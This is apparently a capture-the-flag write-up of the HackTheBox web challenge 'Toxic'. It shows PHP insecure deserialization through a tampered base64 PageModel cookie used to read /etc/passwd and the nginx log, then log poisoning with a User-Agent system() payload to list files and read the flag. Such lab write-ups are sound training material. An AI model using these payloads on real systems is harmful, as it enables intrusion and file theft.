# HackTheBox Toxic

![Open Lightbox](../assets/toxic1.webp){ .glightbox .center width="600" }
```
HTB-Challenges:- Web   
Challenge Info:- Web-Application-based 
Challenge level:- Easy
```

---
Started the machine and got the ip and port opened the browser and entered URL.

![Open Lightbox](../assets/toxic2.webp){ .glightbox .center width="500" }

Got a Simple web page and also downloaded the Necessary files to play the challenge.
unzipped the file and there we go the flag, lol not so easily its just a test flag.


![Open Lightbox](../assets/toxic3.webp){ .glightbox .center width="500" }

So i continued to manually find any clue in the files and finally saw something interesting.

Toxic/web\_toxic/challenge/index.php

![Open Lightbox](../assets/toxic4.webp){ .glightbox .center width="500" }

Serialize and Unserialize as soon as I saw this I knew it was an Insecure Deserialization vulnerability So I looked at the cookie of the URL that opened.

![Open Lightbox](../assets/toxic5.webp){ .glightbox .center width="500" }

Now i copied the cookie and decoded it base64.

![Open Lightbox](../assets/toxic6.webp){ .glightbox .center width="500" }

```
O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}%
```
now I was more confident that it must be an Insecure Deserialization vulnerability

Reference for Insecure Deserialization

[**Insecure Deserialization**  
*Edit description*tanish-26.gitbook.io](https://tanish-26.gitbook.io/insecuredeserialization/ "https://tanish-26.gitbook.io/insecuredeserialization/")

So now i made some changes in the cookie to test it.

```bash
"O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}"
```

And again encoded it as base64.

```js
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30K
```

Now used burp suite to capture the request and in the repeater changed the values for this particular parameter.


```bash
Cookie: PHPSESSID= 
```
And put the encoded value there.

![Open Lightbox](../assets/toxic6.webp){ .glightbox .center width="500" }

And it worked, so now we can look for how can we obtain the flag   
because it was mentioned in the lab description not to obtain a shell but we in to fetch the flag.

Let’s do that first I requested /var/log/nginx/access.log and again encoded it as base64 and sent the request.

![Open Lightbox](../assets/toxic8.webp){ .glightbox .center width="500" }

So the user-agent was reflected as well we can try putting a payload in the user-agent.   

let’s do that and try again and this time got it, it listed all the contents of the / folder including the flag.


```php
<? Php system('ls /');?>
```

Also base64 encode it.

```bash
echo 'O:9:"PageModel":1:{s:4:"file";s:11:"/flag\_abY2P";}' | base64
```

```js
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2ZsYWdfYWJZMlAiO30K
```
Send the request and here we got the flag.

![Open Lightbox](../assets/toxic9.webp){ .glightbox .center width="500" }

Thank you for reading


